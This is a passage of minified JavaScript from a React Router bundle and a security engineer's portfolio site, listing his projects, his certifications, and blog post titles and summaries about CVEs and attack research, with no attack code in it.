$.createElement($.Fragment,null,$.createElement("h2",null,"Unexpected Application Error!"),$.createElement("h3",{style:{fontStyle:"italic"}},e),n?$.createElement("pre",{style:s},n):null,null)}const Ob=$.createElement(Ub,null);class Fb extends $.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,n){return n.location!==e.location||n.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:n.error,location:n.location,revalidation:e.revalidation||n.revalidation}}componentDidCatch(e,n){console.error("React Router caught the following error during render",e,n)}render(){return this.state.error!==void 0?$.createElement(ms.Provider,{value:this.props.routeContext},$.createElement(T0.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function Bb(t){let{routeContext:e,match:n,children:i}=t,s=$.useContext(dp);return s&&s.static&&s.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(s.staticContext._deepestRenderedBoundaryId=n.route.id),$.createElement(ms.Provider,{value:e},i)}function zb(t,e,n,i){var s;if(e===void 0&&(e=[]),n===void 0&&(n=null),i===void 0&&(i=null),t==null){var r;if(!n)return null;if(n.errors)t=n.matches;else if((r=i)!=null&&r.v7_partialHydration&&e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let a=t,o=(s=n)==null?void 0:s.errors;if(o!=null){let h=a.findIndex(d=>d.route.id&&(o==null?void 0:o[d.route.id])!==void 0);h>=0||Ct(!1),a=a.slice(0,Math.min(a.length,h+1))}let l=!1,c=-1;if(n&&i&&i.v7_partialHydration)for(let h=0;h<a.length;h++){let d=a[h];if((d.route.HydrateFallback||d.route.hydrateFallbackElement)&&(c=h),d.route.id){let{loaderData:p,errors:f}=n,y=d.route.loader&&p[d.route.id]===void 0&&(!f||f[d.route.id]===void 0);if(d.route.lazy||y){l=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((h,d,p)=>{let f,y=!1,_=null,g=null;n&&(f=o&&d.route.id?o[d.route.id]:void 0,_=d.route.errorElement||Ob,l&&(c<0&&p===0?(Xb("route-fallback"),y=!0,g=null):c===p&&(y=!0,g=d.route.hydrateFallbackElement||null)));let u=e.concat(a.slice(0,p+1)),v=()=>{let x;return f?x=_:y?x=g:d.route.Component?x=$.createElement(d.route.Component,null):d.route.element?x=d.route.element:x=h,$.createElement(Bb,{match:d,routeContext:{outlet:h,matches:u,isDataRoute:n!=null},children:x})};return n&&(d.route.ErrorBoundary||d.route.errorElement||p===0)?$.createElement(Fb,{location:n.location,revalidation:n.revalidation,component:_,error:f,children:v(),routeContext:{outlet:null,matches:u,isDataRoute:!0}}):v()},null)}var k0=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(k0||{}),L0=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(L0||{});function Vb(t){let e=$.useContext(dp);return e||Ct(!1),e}function Hb(t){let e=$.useContext(kb);return e||Ct(!1),e}function Gb(t){let e=$.useContext(ms);return e||Ct(!1),e}function P0(t){let e=Gb(),n=e.matches[e.matches.length-1];return n.route.id||Ct(!1),n.route.id}function Wb(){var t;let e=$.useContext(T0),n=Hb(),i=P0();return e!==void 0?e:(t=n.errors)==null?void 0:t[i]}function jb(){let{router:t}=Vb(k0.UseNavigateStable),e=P0(L0.UseNavigateStable),n=$.useRef(!1);return A0(()=>{n.current=!0}),$.useCallback(function(s,r){r===void 0&&(r={}),n.current&&(typeof s=="number"?t.navigate(s):t.navigate(s,Ga({fromRouteId:e},r)))},[t,e])}const Zf={};function Xb(t,e,n){Zf[t]||(Zf[t]=!0)}function qb(t,e){t==null||t.v7_startTransition,t==null||t.v7_relativeSplatPath}function Wi(t){Ct(!1)}function Yb(t){let{basename:e="/",children:n=null,location:i,navigationType:s=Ji.Pop,navigator:r,static:a=!1,future:o}=t;to()&&Ct(!1);let l=e.replace(/^\/*/,"/"),c=$.useMemo(()=>({basename:l,navigator:r,static:a,future:Ga({v7_relativeSplatPath:!1},o)}),[l,o,r,a]);typeof i=="string"&&(i=Gr(i));let{pathname:h="/",search:d="",hash:p="",state:f=null,key:y="default"}=i,_=$.useMemo(()=>{let g=up(h,l);return g==null?null:{location:{pathname:g,search:d,hash:p,state:f,key:y},navigationType:s}},[l,h,d,p,f,y,s]);return _==null?null:$.createElement(Ws.Provider,{value:c},$.createElement(rc.Provider,{children:n,value:_}))}function $b(t){let{children:e,location:n}=t;return Ib(yd(e),n)}new Promise(()=>{});function yd(t,e){e===void 0&&(e=[]);let n=[];return $.Children.forEach(t,(i,s)=>{if(!$.isValidElement(i))return;let r=[...e,s];if(i.type===$.Fragment){n.push.apply(n,yd(i.props.children,r));return}i.type!==Wi&&Ct(!1),!i.props.index||!i.props.children||Ct(!1);let a={id:i.props.id||r.join("-"),caseSensitive:i.props.caseSensitive,element:i.props.element,Component:i.props.Component,index:i.props.index,path:i.props.path,loader:i.props.loader,action:i.props.action,errorElement:i.props.errorElement,ErrorBoundary:i.props.ErrorBoundary,hasErrorBoundary:i.props.ErrorBoundary!=null||i.props.errorElement!=null,shouldRevalidate:i.props.shouldRevalidate,handle:i.props.handle,lazy:i.props.lazy};i.props.children&&(a.children=yd(i.props.children,r)),n.push(a)}),n}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function xd(){return xd=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},xd.apply(this,arguments)}function Kb(t,e){if(t==null)return{};var n={},i=Object.keys(t),s,r;for(r=0;r<i.length;r++)s=i[r],!(e.indexOf(s)>=0)&&(n[s]=t[s]);return n}function Zb(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function Jb(t,e){return t.button===0&&(!e||e==="_self")&&!Zb(t)}const Qb=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],eS="6";try{window.__reactRouterVersion=eS}catch{}const tS="startTransition",Jf=jy[tS];function nS(t){let{basename:e,children:n,future:i,window:s}=t,r=$.useRef();r.current==null&&(r.current=ib({window:s,v5Compat:!0}));let a=r.current,[o,l]=$.useState({action:a.action,location:a.location}),{v7_startTransition:c}=i||{},h=$.useCallback(d=>{c&&Jf?Jf(()=>l(d)):l(d)},[l,c]);return $.useLayoutEffect(()=>a.listen(h),[a,h]),$.useEffect(()=>qb(i),[i]),$.createElement(Yb,{basename:e,children:n,location:o.location,navigationType:o.action,navigator:a,future:i})}const iS=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",sS=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ft=$.forwardRef(function(e,n){let{onClick:i,relative:s,reloadDocument:r,replace:a,state:o,target:l,to:c,preventScrollReset:h,viewTransition:d}=e,p=Kb(e,Qb),{basename:f}=$.useContext(Ws),y,_=!1;if(typeof c=="string"&&sS.test(c)&&(y=c,iS))try{let x=new URL(window.location.href),S=c.startsWith("//")?new URL(x.protocol+c):new URL(c),E=up(S.pathname,f);S.origin===x.origin&&E!=null?c=E+S.search+S.hash:_=!0}catch{}let g=Lb(c,{relative:s}),u=rS(c,{replace:a,state:o,target:l,preventScrollReset:h,relative:s,viewTransition:d});function v(x){i&&i(x),x.defaultPrevented||u(x)}return $.createElement("a",xd({},p,{href:y||g,onClick:_||r?i:v,ref:n,target:l}))});var Qf;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher",t.useViewTransitionState="useViewTransitionState"})(Qf||(Qf={}));var em;(function(t){t.UseFetcher="useFetcher",t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(em||(em={}));function rS(t,e){let{target:n,replace:i,state:s,preventScrollReset:r,relative:a,viewTransition:o}=e===void 0?{}:e,l=C0(),c=no(),h=R0(t,{relative:a});return $.useCallback(d=>{if(Jb(d,n)){d.preventDefault();let p=i!==void 0?i:Fl(c)===Fl(h);l(t,{replace:p,state:s,preventScrollReset:r,relative:a,viewTransition:o})}},[c,l,h,i,s,n,t,r,a,o])}function aS({onToggleTheme:t,theme:e}){const n=no(),i=C0(),[s,r]=$.useState(!1),a=(c,h)=>{c.preventDefault();const d=()=>{const p=document.getElementById(h);p&&p.scrollIntoView({behavior:"smooth",block:"start"})};n.pathname!=="/"?(i("/"),setTimeout(d,120)):d(),r(!1)},o=[{label:"About",anchor:"about"},{label:"Experience",anchor:"experience"},{label:"Projects",to:"/projects"},{label:"Certs",to:"/certifications"},{label:"Blog",to:"/blogs"},{label:"Security Games",to:"/cve-map"},{label:"Contact",anchor:"contact"}],l=c=>n.pathname===c;return m.jsxs(m.Fragment,{children:[m.jsx("nav",{className:"hud",children:m.jsxs("div",{className:"container hud-inner",children:[m.jsx(Ft,{to:"/",className:"hud-brand",children:"Hem Parekh"}),m.jsx("div",{className:"hud-links",children:o.map(c=>c.anchor?m.jsxs("a",{href:`#${c.anchor}`,className:"hud-link",onClick:h=>a(h,c.anchor),children:[m.jsx("span",{children:c.label}),m.jsx("div",{className:"link-track",children:m.jsx("div",{className:"link-track-fill"})})]},c.label):m.jsxs(Ft,{to:c.to,className:`hud-link ${l(c.to)?"active":""}`,onClick:()=>r(!1),children:[m.jsx("span",{children:c.label}),m.jsx("div",{className:"link-track",children:m.jsx("div",{className:"link-track-fill"})})]},c.label))}),m.jsxs("div",{className:"hud-actions",children:[m.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:t,type:"button",children:["Theme ",e==="dark"?"Light":"Dark"]}),m.jsxs("button",{className:`menu-toggle ${s?"open":""}`,type:"button",onClick:()=>r(c=>!c),"aria-expanded":s,"aria-controls":"hud-menu",children:[m.jsxs("span",{className:"menu-toggle-lines","aria-hidden":"true",children:[m.jsx("span",{className:"menu-line"}),m.jsx("span",{className:"menu-line"}),m.jsx("span",{className:"menu-line"})]}),m.jsx("span",{className:"menu-label",children:"Menu"})]})]})]})}),m.jsx("div",{className:`hud-menu ${s?"open":""}`,id:"hud-menu","aria-hidden":!s,children:m.jsxs("div",{className:"hud-menu-list",children:[o.map(c=>c.anchor?m.jsxs("a",{href:`#${c.anchor}`,className:"menu-link",onClick:h=>a(h,c.anchor),children:[m.jsx("span",{children:c.label}),m.jsx("div",{className:"link-track",children:m.jsx("div",{className:"link-track-fill"})})]},c.label):m.jsxs(Ft,{to:c.to,className:"menu-link",onClick:()=>r(!1),children:[m.jsx("span",{children:c.label}),m.jsx("div",{className:"link-track",children:m.jsx("div",{className:"link-track-fill"})})]},c.label)),m.jsx("button",{className:"btn",type:"button",onClick:()=>r(!1),children:"Close"})]})})]})}const _d=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],oS={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},tm={title:"ABOUT ME",image:"/images/profile.jpeg",text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},lS=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],N0=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]},{title:"ShellScribe",description:"Offline-first, policy-gated security testing framework with modular plugins, reproducible runs, and evidence-bound reporting for authorized research workflows.",href:"https://github.com/Hem1700/shellscribe",tags:["Security","Toolkit","Automation"]}],I0=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],cS={title:"Ops Log // Latest Signals",subtitle:"Field notes from exploit labs, CVE hunts, and defensive experiments.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},Wa=[{slug:"llm_multistage_attacks_technical_breakdown_full",title:"On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown",href:"/blog/llm_multistage_attacks_technical_breakdown_full",excerpt:"A technical breakdown of why LLMs struggle with multistage network attacks and how the Incalmo framework changes outcomes for autonomous red teaming.",date:"January 20, 2026",readTime:"25 min read",category:"Research Papers"},{slug:"villager_inside_out",title:"Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)",href:"/blog/villager_inside_out",excerpt:"A defender-focused teardown of the villager agent stack: FastAPI control plane, task-graph orchestration, MCP tool execution, and the risk model around exposed tools.",date:"January 6, 2026",readTime:"12 min read",category:"Research Papers"},{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read",category:"Research Papers"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read",category:"CVEs/Libraries"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read",category:"Research Papers"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read",category:"Research Papers"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read",category:"Research Papers"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read",category:"Research Papers"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read",category:"CVEs/Libraries"}];function uS(){return m.jsx("footer",{className:"footer",children:m.jsxs("div",{className:"container footer-grid",children:[m.jsxs("div",{children:[m.jsx("h4",{children:"Sitemap"}),m.jsx(Ft,{to:"/",children:"Home"}),m.jsx("br",{}),m.jsx(Ft,{to:"/projects",children:"Projects"}),m.jsx("br",{}),m.jsx(Ft,{to:"/certifications",children:"Certifications"}),m.jsx("br",{}),m.jsx(Ft,{to:"/blogs",children:"Blog"}),m.jsx("br",{}),m.jsx(Ft,{to:"/cve-map",children:"Security Games"})]}),m.jsxs("div",{children:[m.jsx("h4",{children:"Connect"}),_d.map(t=>m.jsx("div",{children:m.jsx("a",{href:t.href,target:"_blank",rel:"noreferrer",children:t.label})},t.href))]})]})})}function dS({links:t=[]}){return m.jsx("div",{className:"social-icons",children:t.map(e=>m.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer","aria-label":e.label||"Social link",children:m.jsx("i",{className:e.icon})},e.href))})}function D0(t=.15){const e=$.useRef(null),[n,i]=$.useState(!1);return $.useEffect(()=>{const s=e.current;if(!s)return;const r=new IntersectionObserver(([a])=>{a.isIntersecting&&(i(!0),r.unobserve(a.target))},{threshold:t});return r.observe(s),()=>r.disconnect()},[t]),[e,n]}function hS({data:t,socials:e}){const[n,i]=D0();return m.jsx("section",{className:`section about reveal ${i?"visible":""}`,id:"about",ref:n,children:m.jsxs("div",{className:"container about-grid",children:[m.jsxs("div",{className:"about-copy",children:[m.jsx("div",{className:"eyebrow",children:"About"}),m.jsx("h2",{className:"section-title",children:t.title}),m.jsx("p",{className:"lead",children:t.text}),m.jsx(dS,{links:e})]}),m.jsx("div",{className:"about-media",children:m.jsx("img",{src:t.image,alt:t.title})})]})})}function U0({posts:t=[],page:e=1,totalPages:n=1,onPageChange:i,wrap:s=!0}){const r=m.jsxs(m.Fragment,{children:[t.map(a=>m.jsxs("article",{className:"blog-row",children:[m.jsxs("div",{className:"blog-row-meta",children:[m.jsx("div",{className:"blog-row-date",children:a.date}),m.jsx("div",{className:"blog-row-time",children:a.readTime})]}),m.jsxs("div",{className:"blog-row-body",children:[m.jsx(Ft,{to:a.href,className:"blog-row-title",children:a.title}),m.jsx("p",{className:"blog-row-excerpt",children:a.excerpt}),m.jsx("div",{className:"blog-tags",children:m.jsx("span",{className:"pill",children:"Security"})})]}),m.jsx("div",{className:"blog-row-cta",children:m.jsx(Ft,{to:a.href,className:"view-credentials",children:"Read"})})]},a.title)),n>1&&m.jsxs("div",{className:"blog-pagination",children:[m.jsx("button",{className:"pill",disabled:e===1,onClick:()=>i==null?void 0:i(Math.max(1,e-1)),type:"button",children:"Previous"}),m.jsxs("span",{className:"blog-page-indicator",children:["Page ",e," of ",n]}),m.jsx("button",{className:"pill",disabled:e===n,onClick:()=>i==null?void 0:i(Math.min(n,e+1)),type:"button",children:"Next"})]})]});return s?m.jsx("section",{className:"blog-list-section",children:m.jsx("div",{className:"container blog-list",children:r})}):m.jsx("div",{className:"blog-list",children:r})}function pS({issuer:t="Cert"}){var n;const e=((n=t==null?void 0:t[0])==null?void 0:n.toUpperCase())||"C";return m.jsx("div",{className:"cert-badge",children:e})}const fS=["All","Security","Cloud","Networking"];function O0({items:t=[],showViewAll:e=!1,showHeader:n=!0,wrap:i=!0}){const[s,r]=$.useState("All"),[a,o]=$.useState(1),l=5,c=$.useMemo(()=>s==="All"?t:t.filter(y=>y.domain?y.domain===s:!0),[s,t]),h=Math.max(1,Math.ceil(c.length/l)),d=c.slice((a-1)*l,a*l),p=y=>{r(y),o(1)},f=m.jsxs(m.Fragment,{children:[n&&m.jsxs("div",{className:"section-header",children:[m.jsx("div",{children:m.jsx("h2",{className:"section-title",children:"Certifications"})}),e&&m.jsx("div",{className:"section-actions",children:m.jsx(Ft,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),n&&m.jsx("div",{className:"filter-chips",children:fS.map(y=>m.jsx("button",{className:`chip ${y===s?"active":""}`,type:"button",onClick:()=>p(y),children:y},y))}),m.jsx("div",{className:"cert-list",children:d.map(y=>m.jsxs("div",{className:"cert-row",children:[m.jsxs("div",{className:"cert-row-meta",children:[m.jsx("div",{className:"cert-row-badge",children:m.jsx(pS,{issuer:y.issuer})}),m.jsxs("div",{className:"cert-row-tags",children:[m.jsx("span",{className:"pill",children:y.domain}),m.jsx("span",{className:"pill",children:y.issuer})]})]}),m.jsxs("div",{className:"cert-row-body",children:[m.jsx("div",{className:"cert-row-title",children:y.title}),m.jsx("p",{className:"cert-row-details",children:y.details})]}),m.jsx("div",{className:"cert-row-cta",children:m.jsx("a",{href:y.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},y.title))}),h>1&&m.jsxs("div",{className:"blog-pagination project-pagination",children:[m.jsx("button",{className:"pill",disabled:a===1,onClick:()=>o(Math.max(1,a-1)),type:"button",children:"Previous"}),m.jsxs("span",{className:"blog-page-indicator",children:["Page ",a," of ",h]}),m.jsx("button",{className:"pill",disabled:a===h,onClick:()=>o(Math.min(h,a+1)),type:"button",children:"Next"})]})]});return i?m.jsx("section",{className:"section certifications",id:"certs",children:m.jsx("div",{className:"container",children:f})}):m.jsx("div",{className:"certifications",children:f})}function mS({data:t}){const[e,n]=D0();return m.jsx("header",{className:`hero reveal ${n?"visible":""}`,id:"home",ref:e,children:m.jsxs("div",{className:"container hero-grid",children:[m.jsxs("div",{className:"hero-copy",children:[m.jsx("div",{className:"eyebrow",children:"Security engineer // pen 